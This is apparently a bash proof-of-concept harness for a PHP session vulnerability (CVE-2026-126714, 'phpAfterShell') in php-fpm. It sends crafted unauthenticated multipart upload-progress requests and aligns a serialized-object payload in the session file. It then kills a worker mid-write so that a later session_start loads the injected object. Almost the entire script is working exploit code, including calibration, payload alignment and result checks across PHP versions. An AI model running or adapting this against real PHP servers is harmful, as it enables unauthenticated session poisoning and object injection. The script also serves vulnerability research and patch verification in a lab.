#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) UNAUTHENTICATED producer, FPM
# lane. Companion to php2shell-aftershell-splice-upload.sh (CGI): the same
# unauth rfc1867 upload-progress carrier/replacement splice, but the process
# that dies mid-FILE_START-pwrite is a REAL php-fpm worker child, and the
# master respawns it — closing the last SAPI gap for this primitive. All
# requests go over loopback FastCGI via php2shell-fpm-client.py; no other
# SAPI, proxy or target is involved.
#
# Two FPM master instances run sequentially (session state lives in the
# save_path files, so a restart loses nothing):
#   phase 1 (calibration + carrier): AFTERSHELL_LOG_ONLY=1, no kill env —
#     the calibration POST's FILE_START pwrite buffer is dumped and K =
#     len(carrnew record) read back; carrier rebuilt until OBJ sits at K.
#   phase 2 (kill + consumer + control): AFTERSHELL_KILL_AT=$K plus
#     AFTERSHELL_KILL_ARM=<file> — the kill shim only fires while that file
#     exists, so exactly ONE request (the replacement POST) dies mid-write;
#     the respawned worker serves the consumer with the arm removed.
# This per-request arming is the only change to the committed shim and is
# ignored by the CGI harnesses (no ARM env -> always armed, as before).
#
# Expected: 8.4.26 / 8.4.27 — worker dies at the first FILE_START pwrite,
# master respawns, sess file holds k1new || C[K:] (splice on disk), and a
# plain session_start() on the respawned worker promotes
# $_SESSION['evil'] = stdClass{proof:"pwned"} with no warning.
# 8.4.28 (vendor fix): ftruncate(0) runs first, so the same kill leaves a
# K-byte file (carrier tail gone) and the consumer sees no evil key.
#
# Usage: bash lab/repro/php2shell-aftershell-splice-upload-fpm.sh <php-fpm-bin> [outdir] [port]
#   <php-fpm-bin>: lab/build/php-<ver>-fpm-asan/sapi/fpm/php-fpm

set -u
FPM=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
PORT=${PORT:-${3:-18131}}
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
mkdir -p "$OUT"
LOG="$OUT/aftershell-upload-fpm-$LABEL.log"
: > "$LOG"

REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
MPID=
cleanup() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    if [ "${KEEP_TMP:-0}" = 1 ]; then echo "KEEP_TMP=$D" >&2; else rm -rf "$D"; fi
}
trap cleanup EXIT
SESS="$D/sess"; WWW="$D/www"; mkdir -p "$SESS" "$WWW"
SID="uprod"
DUMP="$D/pwrites.bin"
ARM="$D/armed"
BOUNDARY='---------------------------20896060251896012921717172737'
KA2=""   # AFTERSHELL_KILL_AT for the phase-2 master, set after calibration

printf '<?php' > "$WWW/worker.php"

OBJ='evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
X700=$(head -c 700 /dev/zero | tr '\0' 'X')

# ---------------------------------------------------------------- FPM config
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[post_max_size] = 1G
php_admin_value[max_file_uploads] = 20
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 1M
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = $SESS
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.serialize_handler] = php
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 0
php_admin_value[session.use_only_cookies] = 0
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
EOF
{ echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"

# ---------------------------------------------------------------- helpers
fcgi() { python3 "$CLIENT" "$PORT" "$@"; }
offset_of() { # $1 = file, $2 = needle -> byte offset or -1
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
}
seg_after() { # $1 = file, $2 = needle -> bytes from needle offset to end
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
}
esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
mpbody() { # $1 = progress key, $2 = raw filename -> stdout (same as CGI harness)
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n1\r\n" "$BOUNDARY" "$(esc_fn "$2")"
    printf -- "--%s--\r\n" "$BOUNDARY"
}
post() { # $1 = progress key, $2 = raw filename -> sends the multipart request
    mpbody "$1" "$2" > "$D/body"
    fcgi "$WWW/worker.php" --body "$D/body" \
        --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
run_consumer() { # $1 = tag
    printf '<?php session_id("%s"); session_start();
echo "%s_EVIL="; var_dump($_SESSION["evil"] ?? null);
echo "%s_KEYS="; var_export(array_keys($_SESSION)); echo "\n";
echo "%s_PID="; echo getmypid(); echo "\n";' \
        "$SID" "$1" "$1" "$1" > "$WWW/consumer.php"
    fcgi "$WWW/consumer.php"
}
wait_port() {
python3 - "$PORT" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
for _ in range(100):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}
child_pids() { pgrep -P "$MPID" 2>/dev/null || true; }
wait_child() { # poll until exactly one worker child exists -> echo its pid
    local i c
    for i in $(seq 1 100); do
        c=$(child_pids)
        if [ "$(echo "$c" | grep -c .)" = 1 ]; then echo "$c"; return 0; fi
        sleep 0.1
    done
    return 1
}
start_fpm() { # phase-2 arming iff KA2 set
    stop_fpm
    (
        export LD_PRELOAD="$SO" \
               AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1 \
               ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
        if [ -n "$KA2" ]; then
            export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
        fi
        exec "$FPM" -n -F -y "$D/fpm.conf"
    ) >> "$LOG" 2>&1 &
    MPID=$!
    wait_port || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
    CHILD=$(wait_child) || { echo "no worker child — inspect $LOG" | tee -a "$LOG"; exit 1; }
}
stop_fpm() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    MPID=
}

# ---------------------------------------------------------------- carrier
# Same geometry as the CGI harness: C = carrrec || objkrec(PAD+OBJ+PAD3 in
# filename) || tailrec; replacement R = carrnew(long filename) || objkrec
# || tailrec (decoded from C, re-encoded byte-identically), len(R) > len(C)
# so mod_files.c skips the truncate; the cut K = len(carrnew) lands inside
# C's objk record exactly at the OBJ bytes.
build_carrier() { # $1 = PAD length before OBJ inside objk's filename
    rm -f "$SESS"/sess_*
    local pad fn
    pad=$(head -c "$1" /dev/zero | tr '\0' 'A')
    fn="$pad$OBJ$(head -c 32 /dev/zero | tr '\0' 'B')"
    post carr "z"   >> "$LOG" 2>&1
    post objk "$fn" >> "$LOG" 2>&1
    post tail "z"   >> "$LOG" 2>&1
}

# ================================= phase 1: calibration + carrier alignment
start_fpm
echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD $(date -u)" >> "$LOG"

build_carrier 100
rm -f "$DUMP"
post carr "$X700" >> "$LOG" 2>&1
K=$(python3 -c 'import sys
d=open(sys.argv[1],"rb").read()
i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1   # buffer starts after marker line
print(d.find(b"upload_progress_objk|", j) - j)' "$DUMP")
NW=$(python3 -c 'import re,sys
d=open(sys.argv[1],"rb").read(); m=re.search(rb"=== pwrite n=(\d+) ===",d)
print(m.group(1).decode() if m else "0")' "$DUMP")
echo "calibration: FILE_START write n=$NW, K(len of carrnew record)=$K" >> "$LOG"
if [ "$K" -le 0 ]; then
    echo "calibration FAILED (no k2 record in FILE_START dump — inspect $DUMP)" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

# ---- align the carrier so OBJ sits at byte offset K (deterministic loop)
PADLEN=100
build_carrier "$PADLEN"
for i in 1 2 3 4 5 6; do
    M1=$(offset_of "$SESS/sess_$SID" 'evil|O:8:"stdClass"')
    DELTA=$((K - M1))
    echo "align pass $i: OBJ at $M1, target K=$K, delta=$DELTA (PAD1=$PADLEN)" >> "$LOG"
    [ "$DELTA" -eq 0 ] && break
    PADLEN=$((PADLEN + DELTA))
    build_carrier "$PADLEN"
done
M1=$(offset_of "$SESS/sess_$SID" 'evil|O:8:"stdClass"')
if [ "$M1" != "$K" ]; then
    echo "ALIGNMENT FAILED: OBJ at $M1, want $K — inspect $LOG" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi
CARRIER="$D/carrier.bin"
cp "$SESS/sess_$SID" "$CARRIER"
echo "carrier aligned: OBJ at byte $M1 == K=$K, carrier size $(wc -c < "$CARRIER")" >> "$LOG"
LENR=$((NW))
LEN_C=$(wc -c < "$CARRIER")
echo "variant-A check: len(R_fs)=$LENR vs carrier size $LEN_C (must be >= or mod_files.c truncates first)" >> "$LOG"
if [ "$LENR" -lt "$LEN_C" ]; then
    echo "   len(R) < len(C) — harness invalid: pad the replacement filename" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi
stop_fpm

# ================================= phase 2: armed kill + respawn + consumer
KA2="$K"
start_fpm
OLDCHILD=$CHILD
echo "== FPM phase-2 master pid=$MPID KILL_AT=$K ARM=$ARM child=$OLDCHILD (armed)" >> "$LOG"

touch "$ARM"
post carr "$X700" >> "$LOG" 2>&1
RC=$?
rm -f "$ARM"
echo "kill-run rc=$RC (2 = FASTCGI_ERROR: worker died mid-request, expected)" >> "$LOG"
FILESZ=$(wc -c < "$SESS/sess_$SID")
echo "file-after-kill: $FILESZ bytes" >> "$LOG"
echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" 'evil|O:8:"stdClass"' | head -c 60)" >> "$LOG"

NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
echo "master respawned worker: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — kill may not have fired" >> "$LOG"

MIXOK=0
python3 - "$SESS/sess_$SID" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
import sys
f = open(sys.argv[1], 'rb').read()
c = open(sys.argv[2], 'rb').read()
k = int(sys.argv[3])
ok = len(f) > k and f[k:] == c[k:] and f[k:k+48].startswith(b'evil|O:8:"stdClass"')
print(f"splice-check: filelen={len(f)} K={k} tail==carrier-tail:{f[k:]==c[k:]} obj-at-K:{f[k:k+48][:20]!r}")
sys.exit(0 if ok else 1)
EOF
[ "$MIXOK" = 1 ] && echo "  post-kill file state: k1new || C[K:] splice on disk" >> "$LOG" \
               || echo "  post-kill file state: NOT the splice — inspect $LOG" >> "$LOG"
[ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"

# ---- consumer: RESPAWNED worker, plain session_start on the spliced file
run_consumer A >> "$LOG" 2>&1
echo "consumer rc=$?" >> "$LOG"

# ---- control: identical carrier + replacement WITHOUT the kill
build_carrier "$PADLEN"
post carr "$X700" >> "$LOG" 2>&1
echo "control-write rc=$?" >> "$LOG"
run_consumer CTL >> "$LOG" 2>&1

# ---------------------------------------------------------------- verdict
echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG"; then
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
fi
grep -q '^A_EVIL=object(stdClass)' "$LOG" \
    && { echo "   UNAUTH PRODUCER->CONSUMER (FPM, respawned worker): promoted stdClass observed" | tee -a "$LOG"; } \
    || { echo "   no promotion (see $LOG)" | tee -a "$LOG"; }
grep -q '^A_PID='"$NEWCHILD"'$' "$LOG" \
    && echo "   consumer was served by the RESPAWNED worker (pid $NEWCHILD)" | tee -a "$LOG"
[ "$MIXOK" = 1 ] && echo "   post-kill file state: splice on disk" | tee -a "$LOG" \
                  || echo "   post-kill file state: NOT the splice (8.4.28: expected)" | tee -a "$LOG"
grep -q '^CTL_EVIL=object(stdClass)' "$LOG" \
    && echo "   CONTROL UNEXPECTED: object without kill — harness invalid" | tee -a "$LOG" \
    || echo "   control (no kill): no object, as expected" | tee -a "$LOG"
if [ -f "$D/fpm-error.log" ]; then
    echo "--- fpm-error.log ---" >> "$LOG"
    grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
fi
exit 0
